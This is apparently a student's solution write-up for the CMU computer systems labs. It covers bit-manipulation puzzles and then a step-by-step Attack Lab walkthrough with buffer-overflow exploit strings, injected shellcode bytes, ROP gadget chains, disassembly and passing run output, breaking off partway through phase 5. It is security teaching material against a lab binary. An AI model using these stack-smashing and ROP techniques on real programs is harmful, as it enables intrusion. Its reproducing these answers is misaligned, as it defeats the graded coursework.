- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 5
- Rating: 2
### Discussion
The solution to this again goes back to understanding how two's complement works. 

Two's complement is almost symmetrical about 0, with a shift of 1, so that there is 1 more negative integer than there are positive integers.

```
     3 => 0x00000003
     2 => 0x00000002
     1 => 0x00000001
     0 => 0x00000000
    -1 => 0xffffffff
    -2 => 0xfffffffe
    -3 => 0xfffffffd
```

So if we just flip every bit in 1, we get -2, if we flip every bit in 2, we get -3...

Therefore the solution is to flip every bit, and then add 1 to account for the asymmetry.
### Solution
```
int negate(int x) {
    return ~x + 1;
}
```
## sign
return 1 if positive, 0 if zero, and -1 if negative
### Rules
- Examples: 
    - sign(130) => 1
    - sign(-23) => -1
- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 10
- Rating: 2
### Discussion
Let's first look at how the outputs map to the range of possible values:
```
0x00000001 >= x >= 0x7fffffff   => return 1
0x00000000 >= x >= 0x00000000   => return 0
0x80000000 >= x >= 0xffffffff   => return -1
```

From looking at these values, we can se that if there is a 1 in the leftmost spot, we know we must return -1.

If there is a 0 in the leftmost spot, we only want to return 0 if all bits are 0, 1 otherwise. 

- x >> 31 will be -1 if x is any negative number and 0 otherwise.
- !!x will be 0 if x is 0 and 1 in any other case.

We can use the | operator to combine these and our problem is solved.

### Solution
```
int sign(int x) {
    return ((!!x) | (x >> 31));
}
```
## getByte
extract byte n from word x
### Rules
- bytes numbered from 0(least significant) to 3(most significant)
- Examples: getByte(0x12345678, 1) => 0x56
- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 6
- Rating 2
### Discussion
The first piece of the solution is creating a locator int, which will have 0s for all bits and 1s for all the bits in the byte specified by n.

The locator is then combined with x using &, so that the output will have all 0s, except for the specified byte, which will be copied over in the correct location, since the locator has all 1s for that byte.

The output is then shifted back by the same amount 0xff was shifted to create the locator.

The last piece is combining the output with 0xff using & to account for the case where n = 3 and 1s are pulled from the left since this is an integer that's being shifted.

The last step is an optimization. Since (n << 3) was used in 2 places, I declared it first as shift to save 1 operator form the total count.
### Solution
```
int getByte(int x, int n) {
    int shift = (n << 3);
    int locator = 0xff << shift;

    return ((x & locator) >> shift) & 0xff;
}
```
## isAsciiDigit
return 1 if 0x30 <= x <= 0x39 (ASCII codes for characters '0' to '9')
### Rules
- Examples:
    * isAsciiDigit(0x35) => 1
    * isAsciiDigit(0x3a) => 0
    * isAsciiDigit(0x05) => 0
- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 15
- Rating: 3
### Discussion
I'm using Jim's solution here for a hint on how to compare x with the boundaries. [bibliography reference 6]

The boundaries here are 0x30 and 0x39. We can check these using the following logic:
* if x < 0x30, (x - 0x30) will be negative
* if x > 0x39, (0x39 - x) will be negative

If both of these values are positive, then we should return 1, otherwise 0.

1. x - 0x30 = x - 0x30 = x + (-0x30) = x + (~0x30 + 1)
2. 0x39 - x = 0x39 - x = 0x39 + (-x) = 0x39 + (~x + 1)
    * simplified: 0x3a + ~x

Once we have these values, we only care about the leftmost bit.

Doing (tmin & x) will be 1 if the leftmost bit is 1 and 0 otherwise. This is how I generate the is_lo and is_hi values.

If either of these values is 1, I return 0, and if they're both 0, 1 is returned.

### Solution
```
int isAsciiDigit(int x) {
    int tmin = 1 << 31;
    int lo_check = x + (~0x30 + 1);
    int hi_check = 0x3a + ~x;

    int is_lo = tmin & lo_check;
    int is_hi = tmin & hi_check;

    return !(is_lo | is_hi);
}
```
## conditional
same as x ? y : z
### Rules
- Example: conditional(2, 4, 5) => 4
- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 16
- Rating: 3
### Discussion
First, we compute a pos_or_neg value. This will be -1 only when x is 0 and 0 in all other cases.

* When x is not 0, we want to return y. 

    Since pos_or_neg will be 0 in this case, we flip every bit to get -1(all bits are 1). Combining that with y using the & operation will keep y unchanged.

    Doing the same thing to z, without flipping the bits to all 1s will set new_z to 0.

* On the other hand, when x is 0, we want to return z.

    Since pos_or_neg will be -1 in this case, the same logic from above applies, but int this case, new_y will be 0 and new_z will be unchanged. 

Since one of new_y or new_z will always be 0, returning the combination of both of them using | will always return the value that's not 0.
### Solution
```
int conditional(int x, int y, int z) {
    int pos_or_neg = ((!x) << 31) >> 31;
    int new_y = ~pos_or_neg & y;
    int new_z = pos_or_neg & z;

    return new_y | new_z;
}
```
## replaceByte
replace byte n in x with c
### Rules
- Examples: replaceByte(0x12345678, 1, 0xab) => 0x1234ab78
- Assume: 0 <= n <= 3; 0 <= c <= 255
- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 10
- Rating: 3
### Discussion
The first step of the solution is creating a locator int where the byte in location n will be 0x00 and all other bits will be 1s.

Next step is creating the to_insert int where the replacement byte is shifted over to the location specified by n, with all other bits being 0s.

Combining x and locator using & creates an output where the nth byte of x is set to 0x00 and all other bytes are unchanged.

The final return is combining this output with to_insert using | to copy over the 1 bits from c to x.

The last modification to the solution is an optimization. (n << 3) is used in to places, so I declare this is shift in the beginning to save 1 operation.
### Solution
```
int replaceByte(int x, int n, int c) {
    int shift = (n << 3);
    int locator = ~(0xff << shift);
    int to_insert = c << shift;

    return (x & locator) | to_insert;
}
```
## logicalNeg
implement the ! operator, using all the legal operators except for !.
### Rules
- Examples: logicalNeg(3) => 0, logicalNeg(0) => 1
- Legal ops: ~, &, ^, |, +, <<, >>
- Max ops: 12
- Rating: 4
### Discussion
There are 3 cases to consider:
1. If x is negative, it will have a 1 as first bit.
2. If x is positive, negative_x (-x) will have 1 as the first bit.
3. If x is 0, both x and negative_x will have 0 as first bit.

is_not_zero is generated by combining x and negative_x using | and shifting it to the right by 31 so that we get the leftmost bit in the rightmost place. 

This output is combined with 0x1 using & to account for integer shift which will pull 1s from the left if 1 is the leftmost bit.

Using the property that a ^ a = 0, the return value will be 0 if is_not_zero is 1 and 0 otherwise.
### Solution
```
int logicalNeg(int x) {
    int negative_x = ~x + 1;
    int is_not_zero = ((x | negative_x) >> 31) & 1;

    return is_not_zero ^ 1;
}
```
## bitParity
returns 1 if x contains an odd number of 0s
### Rules
- Examples:
    * bitParity(5) => 0
    * bitParity(7) => 1
- Legal ops: !, ~, &, ^, |, +, <<, >>
- Max ops: 20
- Rating: 4
### Discussion
Using an online solution for a hint to use xor here to account for parity in different sub-sections of x. [bibliography reference 7]

This solution works because there are 4 possible cases that are relevant to parity. Consider that we split any 32-bit integer x into 2 16-bit integers x_left and x_right.

1. Both x_left and x_right have an even number of 1s
2. Both x_left and x_right have an odd number of 1s
3. x_left has an even number of 1s and x_right has an odd number of 1s
4. x_left has an odd number of 1s and x_right has an even number of 1s

Notice that the cases where x_left and x_right have the same parity, be it even or odd, x will have even parity.

On the other hand, if the parity of x_left and x_right is different, x will have an odd parity.

The xor operation comes in handy to determine if the parity of x_left and x_right is the same or different.
* If the parity is the same, x_left ^ x_right will have even bit parity. This accounts for cases 1 and 2.
* If the parity is different, x_left ^ x_right will have an odd bit parity. This accounts for cases 3 and 4.

There are 2 further properties that simplify the solution. 
* x_left ^ x_right = x ^ x_left = x ^ (x >> 16)
* This logic holds for x of any size, as long as after the splitting x_left and x_right are of the same size. This means we can repeat this process with the leftover half of x until we're down to x_left being only 1 bit long.

The final step is combining the output with 0x1 using &. This accounts for the cases where in negative integers 1s would be pulled from the left, creating a -1 as possible output. 
### Solution
```
int bitParity(int x) {
    x ^= x >> 16;
    x ^= x >> 8;
    x ^= x >> 4;
    x ^= x >> 2;
    x ^= x >> 1;

    return x & 0x1;
}
```
## floatInt2Float
floatInt2Float - Return bit-level equivalent of expression (float) x.

Result is returned as unsigned int, but it is to be interpreted as the bit-level representation of a single-precision floating point values.
### Rules
- Legal ops: Any integer/unsigned operations including: ||, &&. also if, while
- Max ops: 30
- Rating: 4
### Discussion
This is the solution from CMU instructor resources quoted by Jim. [bibliography reference 8]

The first step is finding the absolute value of x, which is done with a conditional statement in decleration of ax. 

The special case of x = 0 is accounted for first, in which case our exponent and fraction values need to be 0 and no further computation is required.

If x is not 0, the first thing we do is shift the bits of x to the right until the most significant bit is in the leftmost place. We also decrement the exponent every time we shift the bits (exp starts at its highest possible value).

Once we shift the most significant bit all the way to the right, the last byte is assigned to residue, which will be used for rounding.

The leftmost 24 bits are then stored in frac.

The last nested if statement is in charge of rounding up or down. If there is rounding, frac might overflow (it can be 24 bits maximum). In that case, the inner if statement adjusts the frac by considering only the last 24 bits and shifting it to the right by one so it fits back into its max size. The exponent is also increased to account for this shift. 

The final return value is a composition of the sign, exponent and fraction, shifted to their correct places as per the 32-bit float specification. 
### Solution
```
unsigned floatInt2Float(int x) {
  
    unsigned sign = (x < 0);
    unsigned ax = (x < 0) ? -x : x;
    unsigned exp = 127+31;
    unsigned residue;
    unsigned frac = 0;

    if (ax == 0) {
        exp = 0;
        frac = 0;
    } 
    else {
        while ((ax & (1<<31)) == 0) {
            ax = ax << 1;
            exp--;
        }
                        
        residue = ax & 0xFF;
        frac = (ax >> 8) & 0x7FFFFF;

        if (residue > 0x80 || (residue == 0x80 && (frac & 0x1))) {
            frac ++;

            if (frac > 0x7FFFFF) {
                frac = (frac & 0x7FFFFF) >> 1;
                exp++;
            }
        }
    }

    return (sign << 31) | (exp << 23) | frac;
}
```
## floatFloat2Int
floatFloat2Int - Return bit-level equivalent of expression (int) f for floating point argument f.

Argument is passed as unsigned int, but it is to be interpreted as the bit-level representation of a single-precision floating point value. 

Anything out of range (including NaN and infinity) should return 0x80000000u.
### Rules
- Legal ops: Any integer/unsigned operations including: ||, &&. also if, while
- Max ops: 30
- Rating: 4
### Discussion
Couldn't get this one working on my own because I wasn't handling the special cases properly. Using Jim's solution. [bibliography reference 9]

This problem is the reverse of the previous one, so we're using similar logic. We must identify the 2 important parts of the float (sign, exponent and fraction) and then compose an integer that results from those.

In general, int = (sign)(2**exponent)(fraction)

is_negative is declared by simply extracting the leftmost bit of the input.

exponent is declared by extracting the first byte after the sign bit.

fraction is declared by extracting the last 3 bytes of the input.

value and power_of_2 are there to account for the formating rules of the fraction and exponent parts of the float input. value adds an implicit 1.0 as the leading bit of the fraction. power_of_2 subtracts (128 + 32) which is the usual starting value of the exponent (see previous problem).

After the necessary variables are declared, there are a few special cases to consider:

1. if the exponent is 0, we want to return 0 right away.

2. if the exponent is 0xff, this signifies +-inf, in which case we return Tmin.

3. if the power_of_2 is > 31 or < -31 this means there is overflow or underflow. In these cases we return Tmin or 0 respectively.

4. if the power_of_2 is positive, we shift our value to the left. This is equivalent to multiplying our number by 2 power_of_2 times. 

5. if the power_of_2 is negative, we shift our value to the right. This is equivalent to dividing our number by 2 power_of_2 times.

6. Finally, we consider if the number is supposed to be negative or positive.
    * if it is negative, we return Tmin if it's smaller than Tmin and the negative of the number otherwise.
    * if it's positive, we return Tmax if it's larger than Tmax and the unchanged number otherwise.
### Solution
```
int floatFloat2Int(unsigned uf) {    
    unsigned signbit = 0x80000000u;
    unsigned is_negative = signbit & uf;
    int exponent = (uf >> 23) & 0xff;
    unsigned fraction = uf & 0x7fffff;
    unsigned value = 0x800000u + fraction;
    int power_of_2 = exponent - 150;
    unsigned number = value;

    if (exponent == 0){ 
        return 0; 
    }

    if (exponent == 255){ 
        return 0x80000000u; 
    }

  
    if (power_of_2 > 31){ 
        return 0x80000000u; 
    }

    if (power_of_2 < -31){ 
        return 0; 
    }

    if (power_of_2 > 0){ 
        number = value << power_of_2; 
    }

    if (power_of_2 < 0){ 
        number = value >> -power_of_2; 
    }
    
    if (is_negative){ 
        return number > 0x80000000u ? 0x80000000u : -number; 
    }
    else{ 
        return number > 0x7fffffff ? 0x80000000u : number; 
    }
}
```

[Back to Top](./labs#highlighted-labs-for-computer-systems)


# Attack Lab

## Phase 1
### Solution
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
C0 17 40 00 00 00 00 00
```
### Discussion
The goal of phase 1 is to overflow the buffer in such a way that we insert some code on the stack that will end up calling the function touch1.

We first have to see how exactly our input is taken in in order to figure out how to overflow the buffer. getbuf is the function in charge of taking in the input (calling gets).

Disassemble of getbuf:
```
00000000004017a8 <getbuf>:
    4017a8:	48 83 ec 28          	sub    $0x28,%rsp
    4017ac:	48 89 e7             	mov    %rsp,%rdi
    4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
    4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
    4017b9:	48 83 c4 28          	add    $0x28,%rsp
    4017bd:	c3                   	retq   
    4017be:	90                   	nop
    4017bf:	90                   	nop
```
From the first instruction of getbuf, we can see that space is created for 0x28 bytes on the stack (%rsp). In decimal terms, that's 40 bytes of space reserved for input. If we provide input that's longer than 40 bytes, we will overflow the buffer.

Let's confirm this:
```
$ ./ctarget -q
    Cookie: 0x59b997fa
    Type string:1234567890123456789012345678901234567890123456789012345678901234567890
    Ouch!: You caused a segmentation fault!
    Better luck next time
    FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
            31 32 33 34 35 36 37 38
            39 30 31 32 33 34 35 36
            37 38 39 30 31 32 33 34
            35 36 37 38 39 30 31 32
            33 34 35 36 37 38 39 30
            31 32 33 34 35 36 37 38
            39 30 31 32 33 34 35 36
            37 38 39 30 31 32 33 34
            35 36 37 38 39 30
```
As expected, providing an input that's bigger than 40 bytes crashes the stack and causes a seg fault.

The goal is to do this, but instead of junk values, insert the address of touch1 into the right place on the stack. The idea is that a return statement from any other function in the code will then return to the top of the stack, where our code will be inserted instead of returning to it's usual next instruction. 

Here is the address of touch1 form the objdump:
```
00000000004017c0 <touch1>:
```
So touch1 lives at 0x4017c0. 

Setting a breakpoint at getbuf+7 and examining the stack so that we can see where exactly we want to insert the address:
```
(gdb) x /12gx $rsp
    0x5561dc78:     0x0000000000000000      0x0000000000000000
    0x5561dc88:     0x0000000000000000      0x0000000000000000
    0x5561dc98:     0x0000000055586000      0x0000000000401976
    0x5561dca8:     0x0000000000000002      0x0000000000401f24
    0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
    0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
The order of these is from top left:
```
word1   word2
word3   word4
word5   return address
```
The current return address is 0x401976 and we want to change that to 0x4017c0. This will lead to touch1 executing instead of the current normal return.

Therefore we need 5 * 8 bytes (our previously determined padding of 40 bytes) of empty input (or any input), followed by 0x4017c0.

Solution that solves the phase:
```
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
C0 17 40 00 00 00 00 00 --> address of touch1
```

Using hex2raw to feed our raw input into ctarget:
```
$ cat phase1_answer | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            C0 17 40 00 00 00 00 00
```
## Phase 2
### Solution
```
48 C7 C7 FA 97 B9 59 C3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 DC 61 55 00 00 00 00
EC 17 40 00 00 00 00 00
```
### Discussion
The goal of phase 2 is to do the same thing as before but to make ctarget call touch2 this time instead of touch1.

From the notes we can see the C code for touch2:
```
void touch2(unsigned val){
    vlevel = 2; //part of validation protocol
    if(val == cookie){
        success message
    }
    else{
        fail message
    }
    exit(0);
}
```
So the important difference between touch1 and touch2 is that touch2 takes in an argument. We can't simply call the function, we must make sure the correct argument is passed. 

From the first line of execution of ctarget, or from the provided file cookie.txt, we can see that our cookie is 0x59b997fa.

The other important thing is the address of touch 2. From objdump, we can see that the address is 0x4017ec.

Looking at the disassembly of touch2 to see how we can pass in an argument:
```
00000000004017ec <touch2>:
    4017ec:	48 83 ec 08          	sub    $0x8,%rsp
    4017f0:	89 fa                	mov    %edi,%edx
    4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
    4017f9:	00 00 00 
    4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
    401802:	75 20                	jne    401824 <touch2+0x38>
    401804:	be e8 30 40 00       	mov    $0x4030e8,%esi
    401809:	bf 01 00 00 00       	mov    $0x1,%edi
    40180e:	b8 00 00 00 00       	mov    $0x0,%eax
    401813:	e8 d8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
    401818:	bf 02 00 00 00       	mov    $0x2,%edi
    40181d:	e8 6b 04 00 00       	callq  401c8d <validate>
    401822:	eb 1e                	jmp    401842 <touch2+0x56>
    401824:	be 10 31 40 00       	mov    $0x403110,%esi
    401829:	bf 01 00 00 00       	mov    $0x1,%edi
    40182e:	b8 00 00 00 00       	mov    $0x0,%eax
    401833:	e8 b8 f5 ff ff       	callq  400df0 <__printf_chk@plt>
    401838:	bf 02 00 00 00       	mov    $0x2,%edi
    40183d:	e8 0d 05 00 00       	callq  401d4f <fail>
    401842:	bf 00 00 00 00       	mov    $0x0,%edi
    401847:	e8 f4 f5 ff ff       	callq  400e40 <exit@plt>
```
From this we can see tha ton the 4th instruction, the value of the cookie is compared to %edi. %rdi is traditionally the register that holds the first argument of a function.

So we need to make sure that %rdi holds our cookie before the cmp instruction is executed. 

We can synthesize some machine code that will do this for us. Then we need to make sure that code gets executed right before touch2 is called. Then we want to call touch2.

Machine code for moving our cookie into %rdi:
```
mov $0x59b997fa, %rdi
```

We need the byte representiation of this code. Following the suggestion from the lab writeup, I can make a file.s with my assembly code, assemble it into a file.o and then disassemble that file to get the code bytes:
```
0000000000000000 <.text>:
0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
7:   c3                      retq
```

This is the code we want to execute, but we can't just put it into the stack. Just like we did with touch1, we need to overflow the buffer with the address that's going to point to this code.

The code itself can live in any part of the input string. I'm going to put it in the beginning. 

Now we need to put the address of the beginning of the stack past the size of the buffer. %rsp usually holds the address of the top of the stack, but the problem with %rsp is that it changes frequently. Generally any function call pops 8 bytes form the stack, so we want to examine what the address in %rsp is at the correct time.

Since we're counting on the return statement of at end of getbuf to return to our injected code like in phase 1, we should check %rsp after the last function call, but before the return instruction in getbuf:
```
00000000004017a8 <getbuf>:
    4017a8:	48 83 ec 28          	sub    $0x28,%rsp
    4017ac:	48 89 e7             	mov    %rsp,%rdi
    4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
    4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
    4017b9:	48 83 c4 28          	add    $0x28,%rsp
    4017bd:	c3                   	retq
```
From looking at the disassembly, it looks like the correct place to check %rsp is after Gets.

After Gets is executed and before return, %rsp holds 0x5561dc78. That's the second piece of our exploit. 

The last part is calling touch2.

Putting it together:
```
48 C7 C7 FA 97 B9 59 C3 --> mov $0x59b997fa,%rdi
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
78 DC 61 55 00 00 00 00 --> address to top of stack
EC 17 40 00 00 00 00 00 --> address of touch2
```

Using hex2raw to feed our raw input into ctarget:
```
$ cat phase2_answer | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch2!: You called touch2(0x59b997fa)
    Valid solution for level 2 with target ctarget
    PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:
            48 C7 C7 FA 97 B9 59 C3
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            78 DC 61 55 00 00 00 00
            EC 17 40 00 00 00 00 00
```
## Phase 3
### Solution
```
48 C7 C7 B0 DC 61 55 C3
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 DC 61 55 00 00 00 00
FA 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
```
### Discussion
Phase 3 requires us to force ctarget to execute touch3. The C code for touch3 is provided in the lab writeup:
```
void touch3(char* sval){
    vlevel = 3;

    if(hexmatch(cookie, sval)){
        success message
    }
    esle{
        fail message
    }
    exit(0);
}

int hexmatch(unsigned val, char* sval){
    char cbuf[110];

    //make position of check string unpredictable:
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x, val);
    return strncmp(sval, s, 9) == 0;
}
```
Touch 3 takes in a pointer to a char as the single argument and it compares the string defined at that location with the cookie value using hexmatch. 

This means we have to pass in an address of the string representiation of our cookie.

Composing the string representation of our cookie using a standard ASCII table to get the bytes for each char:
```
"59b997fa" => 35 39 62 39 39 37 66 61
```

We essentially want to do the same thing as phase 2:
* store the string representation of our cookie somewhere on the stack
* create an instruction that moves that value into rdi
* make getbuf return to the address of that instruction
* call touch3.

Address of touch3 from ctarget objdump:
```
00000000004018fa <touch3>:
```

At this point we can compose something like this:
```
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
78 dc 61 55 00 00 00 00 --> &rsp address from phase2
fa 18 40 00 00 00 00 00 --> address of touch3
35 39 62 39 39 37 66 61 --> cookie string
```
We're using the address in %rsp that we found in phase 2. It should be the same since we're still running ctarget and at the point at which we got the %rsp address there is no differences.

Now like in phase 2, the start of our input must contain the machine code for moving the pointer to our cookie string into %rdi.

0x5561dc78 points to the beginning of our input, so we need to add some number of bytes to it in order to point to the correct place:
* 5 * 8 = 40 bytes for the padding
* 8 bytes for the line that holds our %rsp address
* 8 bytes to get past address of touch3.

Total: +56 = +0x38 bytes. 

0x5561dc78 + 0x38 = 0x5561dcb0.

Generating the machine code that we need to insert into the beginning of the input:
```
0000000000000000 <.text>:
0:   48 c7 c7 b0 dc 61 55    mov    $0x5561dcb0,%rdi
7:   c3                      retq
```

Putting it all together:
```
48 C7 C7 B0 DC 61 55 C3 --> mov $0x5561dcb0, %rdi
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
78 DC 61 55 00 00 00 00 --> address in %rsp from phase 2
FA 18 40 00 00 00 00 00 --> address of touch3
35 39 62 39 39 37 66 61 --> string representation of our cookie
```

Using hex2raw to feed our raw input into ctarget:
```
$ cat phase3_answer | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch3!: You called touch3("59b997fa")
    Valid solution for level 3 with target ctarget
    PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:
            48 C7 C7 B0 DC 61 55 C3
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            78 DC 61 55 00 00 00 00
            FA 18 40 00 00 00 00 00
            35 39 62 39 39 37 66 61
```

## Phase 4
### Solution
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
CC 19 40 00 00 00 00 00
FA 97 B9 59 00 00 00 00
A2 19 40 00 00 00 00 00
EC 17 40 00 00 00 00 00
```
### Discussion
The problem in phase4 is to do the same thing as phase2:
* put the cookie 0x59b997fa into %rdi
* call touch2

The twist is that we can't put any executable code on the stack, since it won't be run in rtarget. We have to use gadgets instead.

Since we can't put the cookie into the register directly, we can instead put it on the stack and then pop it from the stack into the %rdi register.

From looking at Figure 3B of the writeup [bibliography reference 10], machine instruction 0x5f pops the stack directly into %rdi.

The trick for executing that instruction is finding a piece of existing code somewhere in rtarget that has the machine instruction 5f followed by c3. c3 is the encoding for the return instruction. 

The lab writeup warns us that we should only look for gadgets in farm.c part of the code. In that section, there is no 5f instruction, but I found the instruction followed by c3 here:
```
in scramble: 401419:	69 c0 5f c3 00 00    	imul   $0xc35f,%eax,%eax
so 401421: 5f c3
```

Going to give it a shot despite the writeup instructions just to see if it will work.

In order to compose a solution we're following the same logic as we did in phase2:
```
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
21 14 40 00 00 00 00 00 --> address of our gadget
fa 97 b9 59 00 00 00 00 --> cookie
ec 17 40 00 00 00 00 00 --> call to touch2
```

Running it using hex2raw:
```
$ cat phase4_answer_illegal | ./hex2raw | ./rtarget -q
    Cookie: 0x59b997fa
    Type string:Ouch!: You caused a segmentation fault!
    Better luck next time
    FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:rtarget:0:
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            21 14 40 00 00 00 00 00
            FA 97 B9 59 00 00 00 00
            EC 17 40 00 00 00 00 00
```
I wasn't able to confirm this with gdb, but I'm assuming there is protections that only allow code from the farm section of rtarget to be executed this way.

Since the command 5f followed by c3 (or any number of 90 - no-op commands in between) doesn't exist in the farm, we'll need a different strategy.

Instead of popping the cookie straight into %rdi, we could pop it into a different register and see if we can then move it form that register into %rdi.

These are the encodings of instructions that pop the stack into different registers from the writeup Figure 3B:
```
 popq R |  R
   58   | %rax
   59   | %rcx
   5a   | %rdx
   5b   | %rbx
   5c   | %rsp
   5d   | %rbp
   5e   | %rsi
   5f   | %rdi
```
*Note: I'm checking for each of these by doing a string search (ctrl + f) in a text document containing only the part of rtarget objdump that contains the farm functions.

Checking for other possible solutions:
```
% rax:  - 4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
        - 4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
          4019ad:	c3                   	retq

% rcx:  no solution
% rdx:  no solution
% rbx:  no solution
% rsp:  no solution
% rbp:  no solution
% rsi:  no solution
% rdi:  no solution
```

It looks like we'll have to go through %rax. What we need to do now is find existing code by the same process that will move the value from %rax into %rdi. If there isn't such code, we can look for more in-between register hops.

According to Figure 3A:
```
movq %rax, %rdi = 48 89 c7
```

Looking for matching machine code in farm:
```
- 4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
- 4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq
```

It looks like we have 2 options for popping the cookie into %rax and then 2 options for moving from %rax into %rdi:
```
- 4019cc -> 4019a2
- 4019cc -> 4019c5
- 4019ab -> 4019a2
- 4019ab -> 4019c5 --> this is Johnny Kong's solution [bibliography reference 11]
```

Let's put together an input to implement the first solution:
```
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
00 00 00 00 00 00 00 00 --> padding
CC 19 40 00 00 00 00 00 --> popq %rax
FA 97 B9 59 00 00 00 00 --> cookie
A2 19 40 00 00 00 00 00 --> movq %rax, %rdi
EC 17 40 00 00 00 00 00 --> address of touch2
```

Using hex2raw to feed our raw input into rtarget:
```
$ cat phase4_answer | ./hex2raw | ./rtarget -q
    Cookie: 0x59b997fa
    Type string:Touch2!: You called touch2(0x59b997fa)
    Valid solution for level 2 with target rtarget
    PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            00 00 00 00 00 00 00 00
            CC 19 40 00 00 00 00 00
            FA 97 B9 59 00 00 00 00
            A2 19 40 00 00 00 00 00
            EC 17 40 00 00 00 00 00
```

## Phase 5
### Solution
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
AD 1A 40 00 00 00 00 00
D8 19 40 00 00 00 00 00
C5 19 40 00 00 00 00 00
FA 18 40 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 35
39 62 39 39 37 66 61 00
```
### Discussion
Phase 5 wants us to the same thing as phase 3:
* put the address of the string version of the cookie into %rdi
* call touch3

From phase 3:
```
35 39 62 39 39 37 66 61 --> cookie string
```
The added challenge here is that the stack is initalized randomly at runtime, so we can't know the address in %rsp before we run the progam. That was the trick that made phase 3 easy.

However, we can still run code that uses %rsp, so this time we'll have to work with the address of our string-cookie relative to %rsp.
Since the %rsp will always point at the top of the stack, we need to place the cookie in %rsp + some offset.

Ideally we would want an operation movq %rsp, %rdi, but we might have to use an in-between step like in phase 4, depending on what's available in the farm. Let's see what we're looking for. From Figure 3A:
```
movq    %rsp, %rax => 48 89 e0
movq    %rsp, %rcx => 48 89 e1
movq    %rsp, %rdx => 48 89 e2
movq    %rsp, %rbx => 48 89 e3
movq    %rsp, %rsp => 48 89 e4 --> useless
movq    %rsp, %rbp => 48 89 e5
